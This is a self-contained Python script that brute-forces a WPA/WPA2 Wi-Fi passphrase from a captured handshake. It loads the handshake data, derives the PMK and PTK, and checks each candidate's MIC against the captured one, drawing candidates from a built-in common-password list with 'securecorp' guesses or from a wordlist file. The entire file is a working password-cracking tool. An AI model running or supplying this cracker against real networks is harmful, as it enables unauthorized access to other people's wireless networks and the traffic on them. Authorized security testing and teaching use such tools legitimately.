import hashlib, hmac, json, sys, binascii

hs = json.load(open('hs.json'))
SSID = hs['ssid'].encode()
ap = bytes(int(x,16) for x in hs['ap'].split(':'))
cl = bytes(int(x,16) for x in hs['client'].split(':'))
anonce = binascii.unhexlify(hs['anonce'])
snonce = binascii.unhexlify(hs['snonce'])
target_mic = binascii.unhexlify(hs['mic'])

# EAPOL frame of M2 with MIC field zeroed (mic is bytes 81..97 in the EAPOL-Key)
eapol2 = bytearray(binascii.unhexlify(hs['eapol2']))
eapol2[81:97] = b'\x00'*16
eapol2 = bytes(eapol2)

A = b"Pairwise key expansion"
B = min(ap, cl) + max(ap, cl) + min(anonce, snonce) + max(anonce, snonce)

def prf512(pmk):
    r = b''
    for i in range(4):
        r += hmac.new(pmk, A + b'\x00' + B + bytes([i]), hashlib.sha1).digest()
    return r[:64]

def check(pw):
    if isinstance(pw, str): pw = pw.encode()
    pmk = hashlib.pbkdf2_hmac('sha1', pw, SSID, 4096, 32)
    ptk = prf512(pmk)
    kck = ptk[:16]
    mic = hmac.new(kck, eapol2, hashlib.sha1).digest()[:16]
    return mic == target_mic

if __name__ == '__main__':
    src = sys.argv[1] if len(sys.argv) > 1 else None
    if src is None:
        common = ['password','12345678','securecorp','wifitest','Wifi-Test','guest1234',
                  'password1','admin123','letmein123','securecorp123','SecureCorp2026',
                  'companywifi','guestwifi','wifipassword','changeme123','welcome123']
        for pw in common:
            if check(pw):
                print('FOUND:', pw); sys.exit(0)
        print('not in common list')
    else:
        cnt = 0
        with open(src, 'r', encoding='latin-1') as f:
            for line in f:
                pw = line.rstrip('\r\n')
                if len(pw) < 8 or len(pw) > 63:
                    continue
                cnt += 1
                if check(pw):
                    print('FOUND:', repr(pw), 'after', cnt, 'tries'); sys.exit(0)
                if cnt % 2000 == 0:
                    print('  tried', cnt, 'last', repr(pw), flush=True)
        print('exhausted', cnt, 'candidates')
